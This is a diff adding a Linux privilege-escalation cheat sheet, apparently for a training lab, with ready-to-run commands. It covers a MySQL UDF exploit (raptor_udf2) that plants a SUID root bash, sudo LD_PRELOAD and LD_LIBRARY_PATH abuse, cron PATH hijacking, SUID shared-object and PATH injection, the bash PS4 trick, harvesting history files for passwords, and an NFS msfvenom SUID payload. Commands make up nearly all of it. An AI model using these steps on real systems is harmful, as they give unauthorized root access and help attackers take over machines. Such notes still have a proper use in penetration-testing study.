@@ -1,0 +1,146 @@
+#SERVICE EXPLOIT
+https://www.exploit-db.com/exploits/1518
+
+COMPILE EXPLOIT:
+gcc -g -c raptor_udf2.c -fPIC
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+
+LOGIN TO MYSQL AND CREATE MALICIOUS FUNCTION:
+use mysql;
+create table foo(line blob);
+insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
+select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+
+USE EXPLOIT TO COPY /BIN/BASH:
+select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+
+RUN MALICIOUS SUID: /tmp/rootbash -p
+--------------------------------------------------------------------------------
+################################################################################
+--------------------------------------------------------------------------------
+#SUDO - ENVIRONMENT VARIABLES:
+
+#CHECK VULNERABILITY:
+sudo -l
+Matching Defaults entries for user on this host:
+env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+
+LD_PRELOAD и LD_LIBRARY_PATH унаследованы от среды пользователя. 
+LD_PRELOAD загружает общий объект раньше других при запуске программы. 
+LD_LIBRARY_PATH предоставляет список каталогов, в которых сначала выполняется поиск разделяемых библиотек.
+
+#Compile prepared C file:
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
+#Run allowed program from sudo -l with compiled library:
+sudo LD_PRELOAD=/tmp/preload.so program-name-here
+--------------------------------------------------------------------------------
+################################################################################
+--------------------------------------------------------------------------------
+#SUDO - ENVIRONMENT VARIABLES (another method):
+
+#Check libraries of choosen program: ldd /usr/sbin/apache2
+
+#Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) 
+using the code located at /home/user/tools/sudo/library_path.c:
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+
+#Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object)
+sudo LD_LIBRARY_PATH=/tmp apache2
+--------------------------------------------------------------------------------
+################################################################################
+--------------------------------------------------------------------------------
+#Cron Job - PATH ENVIRONMENT VARIABLE
+
+Create file with exist cronjob name (cronjobs without absolute path)
+cat /etc/crontab
+PATH variable: PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+File payload:
+```#!/bin/bash
+
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+```
+Give file execute permission: chmod +x /home/user/overwrite.sh
+--------------------------------------------------------------------------------
+################################################################################
+--------------------------------------------------------------------------------
+#SUID/SGID Executables - Known Exploits
+
+#Find SUID/SGID files:
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+--------------------------------------------------------------------------------
+################################################################################
+--------------------------------------------------------------------------------
+#SUID/SGID Executables - shared object injection
+EXAMPLE:
+strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+
+access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+open("/etc/ld.so.cache", O_RDONLY)      = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libdl.so.2", O_RDONLY)       = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libm.so.6", O_RDONLY)        = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libc.so.6", O_RDONLY)        = 3
+open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
+
+#Executable tries to load the /home/user/.config/libcalc.so shared object within our home directory, but it cannot be found.
+
+#Create dir .config: mkdir /home/user/.config
+#Create payload:
+Example shared object code can be found at /home/user/tools/suid/libcalc.c. It simply spawns a Bash shell. 
+Compile the code into a shared object at the location the suid-so executable was looking for it:
+gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+
+#Execute target program /usr/local/bin/suid-so.
+--------------------------------------------------------------------------------
+################################################################################
+--------------------------------------------------------------------------------
+#SUID / SGID Executables - Environment Variables
+One line ("service apache2 start") suggests that the service executable is being called to start the webserver, 
+however the full path of the executable (/usr/sbin/service) is not being used.
+
+Compile the code located at /home/user/tools/suid/service.c into an executable called service. 
+This code simply spawns a Bash shell: gcc -o service /home/user/tools/suid/service.c
+PATH=.:$PATH /usr/local/bin/suid-env
+run executable.
+--------------------------------------------------------------------------------
+################################################################################
+--------------------------------------------------------------------------------
+#SUID / SGID Executables - Abusing Shell Features (#1)
+function /usr/sbin/service { /bin/bash -p; }
+export -f /usr/sbin/service
+#Execute program that call "service"
+
+#SUID / SGID Executables - Abusing Shell Features (#2) Note: This will not work on Bash versions 4.4 and above.
+When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+/tmp/rootbash -p
+--------------------------------------------------------------------------------
+#Passwords & Keys - History Files 
+cat ~/.*history | less
+--------------------------------------------------------------------------------
+################################################################################
+--------------------------------------------------------------------------------
+#NFS SHARE
+
+cat /etc/exports
+On your Kali box, switch to your root user if you are not already running as root:
+mkdir /tmp/nfs
+mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+chmod +xs /tmp/nfs/shell.elf
+
+On victim: /tmp/shell.elf
+--------------------------------------------------------------------------------
+################################################################################
+--------------------------------------------------------------------------------
+#Kernel Exploits
